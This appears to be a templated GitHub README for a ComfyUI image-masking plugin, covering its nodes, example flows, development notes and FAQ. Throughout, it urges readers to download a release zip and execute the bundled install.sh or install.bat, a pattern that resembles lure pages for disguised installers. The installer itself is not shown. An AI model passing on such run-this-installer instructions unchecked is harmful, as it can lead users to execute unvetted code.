[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/TheoQp/ComfyUI-OpenCut/releases)

# ComfyUI-OpenCut — OpenCut Integration for Masked Editing

![Banner: mask and node graph](https://upload.wikimedia.org/wikipedia/commons/7/73/Photo_editor_icon.svg)

- A ComfyUI plugin that integrates OpenCut into ComfyUI.
- Use mask-driven cutout, inpainting, and layered compositing inside node graphs.
- Works with ComfyUI node pipelines and standard image tensors.

Table of contents
- Quick links
- Key features
- Requirements
- Install (release asset download and execution)
- Basic usage
- Node reference
- Example flows
- Advanced tips
- API and internals
- Development setup
- Testing and CI
- Contributing
- License
- FAQ
- Changelog and releases

Quick links
- Releases: https://github.com/TheoQp/ComfyUI-OpenCut/releases
- Releases (button): [![Get Releases](https://img.shields.io/badge/Get%20Releases-%20Download-green?logo=github)](https://github.com/TheoQp/ComfyUI-OpenCut/releases)

Key features
- Mask-aware cutouts: extract subject regions using OpenCut masks.
- Alpha matte output: high-quality alpha channel for compositing.
- Layered output: separate foreground, background, and matte as distinct nodes.
- Inpainting support: pass masked regions to inpainting nodes in ComfyUI.
- Edge-aware feathering: preserve clean borders for composite.
- Guided cutout: accept a guide image or prompt to refine mask.
- Batch mode: process multiple images in a single flow.
- Cross-platform: runs on systems that support ComfyUI and Python.

Requirements
- ComfyUI version compatible with community plugins (check ComfyUI docs).
- Python 3.8+ (match ComfyUI runtime).
- A GPU with CUDA is recommended for speed.
- OpenCut runtime code or binary packaged in releases.
- Typical supported image formats: PNG, JPG, WebP.
- Node runtime libraries used by ComfyUI (PIL / torchvision optional).

Install

Important release step
- Download the release asset from the Releases page: https://github.com/TheoQp/ComfyUI-OpenCut/releases
- The releases page contains packaged assets. Download the file named comfyui_opencut-<version>.zip (or the platform-specific asset).
- After download, execute the included installer script:
  - On Linux / macOS: run the included install.sh
  - On Windows: run install.bat
- The installer copies nodes to ComfyUI/plugins/ComfyUI-OpenCut and registers the plugin.

Why this step matters
- The release asset bundles compiled code, models, and node definitions.
- The installer places files where ComfyUI loads community plugins.

Detailed install steps (Linux / macOS)
1. Open a terminal.
2. Download the release zip from Releases.
3. Unpack the asset:
   - unzip comfyui_opencut-<version>.zip
4. Make the installer executable:
   - chmod +x install.sh
5. Run the installer:
   - ./install.sh /path/to/ComfyUI
6. Restart ComfyUI.

Detailed install steps (Windows)
1. Download the release zip from Releases.
2. Extract the zip to a folder.
3. Double-click install.bat or run it from PowerShell:
   - .\install.bat "C:\path\to\ComfyUI"
4. Restart ComfyUI.

Manual install (if you prefer)
- Copy the folder ComfyUI-OpenCut to ComfyUI/plugins/.
- Ensure python files have correct permissions.
- Restart ComfyUI.

If the release link does not work
- Check the Releases section on the repository page in GitHub.
- The Releases page contains archived packages and platform assets.

Basic usage

How the plugin fits in ComfyUI
- The plugin exposes nodes you can place into your graph.
- Each node accepts image tensors, masks, or prompts.
- Nodes return processed image tensors, mask outputs, and metadata.

Main node types
- OpenCut Mask Node: produce a mask from an input image and optional prompts.
- OpenCut Cutout Node: generate cutout PNG with alpha.
- OpenCut Composite Node: composite foreground over a target background.
- OpenCut Inpaint Bridge Node: prepare masked regions for the inpainting nodes.
- OpenCut Batch Node: run OpenCut on multiple inputs in a single run.

Quick flow: single image cutout
1. Add an Image Loader node.
2. Connect Image Loader to OpenCut Mask node.
3. Connect OpenCut Mask node to OpenCut Cutout node.
4. Connect Cutout node to an Image Saver node.
5. Run the graph.

Quick flow: masked inpainting
1. Load image.
2. Mask with OpenCut Mask node.
3. Feed image and mask into OpenCut Inpaint Bridge.
4. Connect Bridge to your inpainting model nodes.
5. Save the final image.

Node reference

OpenCut Mask Node
- Inputs:
  - Image: RGB image tensor.
  - Prompt: text string to guide segmentation (optional).
  - GuideImage: grayscale or RGB image to guide mask (optional).
- Outputs:
  - Mask: single-channel float mask (0..1).
  - Metadata: bounding boxes and confidence.
- Parameters:
  - Mode: auto / foreground / background. Auto selects the subject.
  - Threshold: mask threshold value for binary mask.
  - Feather: pixel radius for edge smoothing.
  - MinArea: ignore small islands below pixel count.

OpenCut Cutout Node
- Inputs:
  - Image
  - Mask
  - TrimapMode: expand/erode for inpainting.
- Outputs:
  - CutoutImage: RGBA PNG tensor.
  - Alpha: float alpha channel.
- Parameters:
  - BackgroundColor: color to fill where alpha is zero.
  - EdgePreserve: strength value (0..1).

OpenCut Composite Node
- Inputs:
  - ForegroundImage (RGBA)
  - BackgroundImage (RGB)
  - BlendMode: normal / multiply / screen / overlay
  - Mask (optional)
- Outputs:
  - CompositeImage (RGB)
- Parameters:
  - OffsetX / OffsetY: place foreground over background.
  - Scale: scale factor for foreground.
  - MatchColor: toggle color matching between layers.

OpenCut Inpaint Bridge Node
- Inputs:
  - Image (RGB)
  - Mask (single channel)
  - FillMode: mean / patch / texture
- Outputs:
  - InpaintReady: tensor and metadata for the inpainting model.
- Purpose:
  - Convert mask and image to a format your inpainting model expects.
  - Provide trimmed boxes and fixed-size crops if needed.

OpenCut Batch Node
- Inputs:
  - List of Images
  - Shared Prompt
- Outputs:
  - List of Masks
  - List of Cutouts
- Parameters:
  - Concurrency: number of parallel workers.
  - SaveIntermediates: persist masks to disk.

Usage notes (how to set thresholds)
- Set Mask Threshold to 0.5 for first pass.
- Increase threshold to remove noise.
- Use Feather to smooth edges and avoid jagged alpha.

Example flows

Example 1 — Headshot cutout and background swap
- Purpose: extract a subject and place it on a new background.
Flow:
1. Image Loader -> OpenCut Mask
2. Mask -> OpenCut Cutout (RGBA)
3. New Background Loader -> OpenCut Composite (FG=Cutout, BG=Background)
4. Composite -> Image Saver

Parameters
- Mask Threshold: 0.6
- Cutout EdgePreserve: 0.8
- Composite Scale: 1.0
- Composite Offset: x=0, y=0

Example 2 — Mask-guided inpainting for object removal
- Purpose: remove an object and fill with plausible texture.
Flow:
1. Image Loader -> OpenCut Mask (with bounding box or prompt "remove car")
2. Mask -> OpenCut Inpaint Bridge
3. Inpaint Bridge -> Inpainting Model Node
4. Inpainting Model Node -> Composite Node (merge result with background if needed)
5. Image Saver

Tips
- Use a prompt in the Mask node to focus segmentation on a particular object.
- Provide a guide image if the subject blends with the background.
- Use bounding box metadata to crop the area for faster processing.
- Normalize image input to the range your model expects.

Advanced usage

Batch processing
- Use the OpenCut Batch Node for multiple images.
- Combine with a loop node to iterate a dataset.
- Save masks and cutouts per-frame for later composition.

Trimaps and alpha refinement
- Trimaps work with three regions: definite foreground, definite background, unknown.
- Use Mask Threshold and Feather to create a trimap.
- Pass trimap to the Cutout node for more control.

Color matching
- Use the Composite node's MatchColor parameter to reduce color mismatch.
- MatchColor runs a simple histogram match or a per-channel gain.

Edge preservation strategies
- Use Gaussian blur on the mask, then threshold.
- Run an edge-aware matte routine in the Cutout node.
- Export alpha as 16-bit to reduce banding.

Performance
- Run on GPU for faster masks.
- For large batches, set Concurrency to number of GPU workers you can hold.
- Crop to bounding boxes to reduce input size for the mask model.

Integrating with other nodes
- Treat OpenCut outputs as standard tensors in ComfyUI.
- Chain nodes for multi-stage processing: mask -> cutout -> tone-map.

API and internals

Runtime layout
- Plugin registers node classes with ComfyUI during startup.
- Nodes map to Python classes in plugin folder.
- Each node defines:
  - Inputs schema
  - Outputs schema
  - Processing function that runs OpenCut code

Model files
- OpenCut core code and models ship in the release assets.
- Models load at node execution time.
- You can place custom models into the plugin/models folder.

Data flow
- Image in -> preprocessing -> model -> postprocessing -> node outputs.
- Mask arrays are float32 bitmaps.
- Metadata contains bounding boxes, confidence, and execution timing.

Logging and debug
- The plugin logs to the ComfyUI console.
- Enable verbose logging in node parameters to gather more trace data.
- Save mask output to disk for offline debugging.

File layout (typical)
- ComfyUI-OpenCut/
  - nodes/
    - opencut_mask.py
    - opencut_cutout.py
    - opencut_composite.py
    - opencut_inpaint_bridge.py
    - opencut_batch.py
  - models/
    - opencut_model_v1.pth
  - assets/
    - icons/
    - demo/
  - install.sh
  - install.bat
  - README.md

Development setup

Local dev environment
1. Clone your ComfyUI repo.
2. Clone this plugin into ComfyUI/plugins/ComfyUI-OpenCut.
3. Create a virtualenv that matches ComfyUI runtime.
4. Install dev dependencies:
   - pip install -r ComfyUI-OpenCut/requirements-dev.txt
5. Start ComfyUI in dev mode and check plugin loads.

Hot-reload during development
- Modify node files and use ComfyUI reload feature in the UI.
- Restart the server for changes to native modules or model files.

Unit tests
- The plugin includes a test suite under tests/.
- Run tests with pytest from the plugin root:
  - pytest tests/
- Tests cover:
  - Mask generation
  - Cutout generation
  - Composite node logic
  - Batch processing

Model training and fine-tuning
- The plugin works with pre-trained OpenCut models.
- You can fine-tune masks by training on domain-specific data.
- Maintain the same input preprocessing to avoid mismatch.

Testing and CI

Continuous integration
- CI runs static checks and unit tests.
- Use GitHub Actions to run tests on push and PR.
- CI tasks:
  - lint: flake8 / black (project style)
  - unit tests: pytest
  - build release artifact

Release packaging
- Use the provided packager script to create zipped assets.
- The packager collects node files, models, and installers.
- Tag releases semantically: vMAJOR.MINOR.PATCH.

Binary dependencies
- Some platforms require compiled code. The release asset may include these binaries.
- The installer script picks the correct binary for the platform.

Contributing

How to help
- Report reproducible issues with steps and sample images.
- Submit PRs for bug fixes and new features.
- Add tests for new nodes or logic changes.
- Improve docs and usage guides.

Code guidelines
- Use short functions. Keep names clear.
- Write docstrings for node classes and parameters.
- Keep dependencies minimal.

Branch strategy
- Work on a feature branch named feat/<short-name>.
- Open a PR against main when ready.
- Provide a test case or demo flow with the PR.

Issue template suggestions
- Describe the expected output.
- Provide the ComfyUI version and platform.
- Attach the flow file and sample images if possible.

License
- The repository uses an open source license (choose one that fits your needs).
- Include the license file in the repo root.

Credits
- Built around ComfyUI plugin API.
- Uses OpenCut model and code under its license.
- Thank the community that creates model training data.

FAQ

Q: Where do I get the plugin release?
A: Get the release asset here: https://github.com/TheoQp/ComfyUI-OpenCut/releases. Download the packaged asset comfyui_opencut-<version>.zip and run the included installer script.

Q: Does this plugin run on CPU?
A: Yes. CPU mode works but it runs slower. Use GPU for speed.

Q: Can I use a custom OpenCut model?
A: Yes. Place your model file into the plugin/models folder and set the ModelPath parameter in the Mask node.

Q: What image formats does it support?
A: PNG, JPG, WebP. Cutout output uses PNG with alpha for best results.

Q: How do I tune edge feather?
A: Increase the Feather parameter. You can also set EdgePreserve in the Cutout node.

Q: How does the Mask node use prompts?
A: The Mask node can accept a text prompt that guides segmentation. Use nouns for subjects, not long sentences.

Q: Can I process video or frame sequences?
A: Use the Batch node plus a loop to iterate frames. For temporal coherence, run a smoothing pass on masks between frames.

Extended examples and walkthroughs

Walkthrough A — Portrait background replace with color grading
1. Load portrait image.
2. Mask for person with prompt "person, face, hair".
3. Cutout the person with alpha.
4. Load background color or gradient image.
5. Composite person over background.
6. Run a color-match node to adjust skin tone to scene lighting.
7. Add a small vignette for focus.

Walkthrough B — Product photography clean plate
1. Load photo with product.
2. Run Mask node with prompt "product" or use bounding box guide.
3. Export Alpha and CutoutImage.
4. Use an automated batch to place product on multiple background colors.
5. Save individual PNGs for catalog.

Walkthrough C — Complex scene isolation
1. Load wide scene.
2. Run Mask node to isolate central subject.
3. Use bounding box metadata to crop and upscale.
4. Run a detail pass on cropped region to refine mask.
5. Composite refined subject back into scene or new background.

Chunking strategy for large images
- Break large images into tiles using bounding boxes.
- Run OpenCut on each tile.
- Merge masks using seam-aware blending.

Memory management
- Free model tensors after node finishes if processing many images.
- Use smaller batch sizes for low-memory GPUs.

Common pitfalls and fixes
- If mask misses hair or fine detail:
  - Increase feather and use trimap with unknown region.
  - Provide a guide image or rough trimap drawn by hand.
- If cutout edges look haloed:
  - Adjust EdgePreserve down and increase feather.
  - Export alpha at higher bit depth.
- If composite looks mismatched:
  - Enable MatchColor in Composite node.
  - Run color correction on foreground prior to composite.

Release management and build notes
- Releases contain prebuilt bundles and models.
- The installer will place files under ComfyUI/plugins/ComfyUI-OpenCut.
- Use the Releases page to get the correct package: https://github.com/TheoQp/ComfyUI-OpenCut/releases

Developer notes for packaging
- Include a small manifest that lists files and checksums.
- Keep model files separate to allow smaller code-only releases.

External resources and references
- ComfyUI docs: (refer to your ComfyUI install or docs)
- OpenCut repo and papers: check the original authors for model details.
- Image alpha compositing theory: Porter-Duff compositing rules.
- Trimap and matting: research alpha matting and feathering algorithms.

Assets and demo images
- Use supplied demo folder in the release to view sample flows.
- Add your own test images under demo/images/.
- Use demo/flows/ to store example ComfyUI flow files.

Examples of node parameter presets
- PortraitPreset
  - Mask Threshold: 0.55
  - Feather: 3
  - EdgePreserve: 0.9
  - MinArea: 500
- ProductPreset
  - Mask Threshold: 0.65
  - Feather: 1
  - EdgePreserve: 0.95
  - MinArea: 200
- BackgroundRemovalPreset
  - Mask Threshold: 0.5
  - Feather: 2
  - TrimapMode: expand

Security and binary notes
- The release may include compiled binaries or pre-trained models.
- Run installers from trusted sources.
- If needed, inspect install scripts before running them.

Glossary
- Alpha: channel that stores transparency values.
- Mask: single-channel map that indicates foreground probability.
- Cutout: image with alpha channel for the extracted subject.
- Trimap: three-region map for matting algorithms.
- Feather: softening of a mask edge.
- Inpaint: fill masked areas with generated content.
- Composite: combine foreground and background images.

Images and icons used in docs
- Use the assets/icons folder for node icons.
- Use sample images under assets/demo for demos.
- Example banner used above: source image from Wikimedia Commons.

Contact and support
- Open an issue for bugs or feature requests.
- Provide flows and sample images to reproduce issues.
- Attach logs and describe platform and ComfyUI version.

Changelog and releases
- Check releases for versioned builds and assets: https://github.com/TheoQp/ComfyUI-OpenCut/releases
- Each release bundles:
  - plugin code
  - prebuilt models for common platforms
  - installer scripts
  - demo flows and images

Legal and model use
- Respect model licenses where applicable.
- Attribution may be required by model authors.

Sample flow files
- flows/portrait_swap.flow — demonstrates headshot extraction and composite.
- flows/product_batch.flow — demonstrates batch product processing.

How to test your install
1. Load the demo flow included in the release.
2. Point Image Loader to demo/images/sample1.png.
3. Run the graph.
4. Confirm outputs:
   - mask.png
   - cutout.png
   - composite.png

Binary installers and required execution
- After you download the release asset from the Releases page, run the included installer script. The asset contains a small installer file that you need to execute to complete the install.

Automated checks
- The plugin runs basic sanity checks on load.
- It validates model presence and node registration.

Caveats
- Some model files may require more disk space.
- On low-memory systems, process images in smaller batches.

Example commands (Linux)
- unzip comfyui_opencut-1.2.0.zip
- chmod +x install.sh
- ./install.sh /home/user/ComfyUI

Example commands (Windows PowerShell)
- Expand-Archive -Path comfyui_opencut-1.2.0.zip -DestinationPath .
- .\install.bat "C:\Users\User\ComfyUI"

Images (demo)
- Demo assets included in releases show mask, cutout, and composite examples.
- Use these to test that the plugin runs end to end.

Keep flows predictable
- Save flows that work for future reuse.
- Tag flows with context and parameters.

End of file content.